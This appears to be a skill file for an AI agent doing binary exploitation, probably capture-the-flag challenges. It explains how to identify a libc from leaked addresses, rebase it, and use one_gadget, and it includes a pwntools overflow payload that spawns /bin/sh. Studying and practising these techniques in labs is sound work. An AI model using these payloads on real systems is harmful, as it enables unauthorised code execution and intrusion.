---
name: libc-id-and-leak
when: you leaked a libc function address but do not know the exact libc, or need one_gadget
tools: [python_exec, shell]
phase: exploit
---
# Identifying libc from a leak, and one_gadget

If the libc file is NOT provided, identify it from a leak (the low 12 bits = offset are ASLR-invariant):
```
# offline DB shipped in the image at /opt/libc-database
cd /opt/libc-database
./find puts XXX printf YYY          # XXX/YYY = last 3 hex digits of the leaked addresses
./download <id>                     # fetches the matching libc + symbols
```
Then rebase: `libc.address = leak - libc.symbols['<the func you leaked>']`.

one_gadget - a single address that execve("/bin/sh") if its constraints hold:
```
one_gadget /workspace/libc.so.6         # lists gadgets + constraints (e.g. [rsp+0x40]==NULL)
```
```python
og = libc.address + 0x50a37             # pick a gadget whose constraints your state meets
io.sendline(flat(b'A'*off, ret, og))
```
Pitfalls: verify the leaked symbol you subtract is correct; try each one_gadget - constraints vary by
state. GOT entries leak libc; `environ` in libc leaks a stack address.
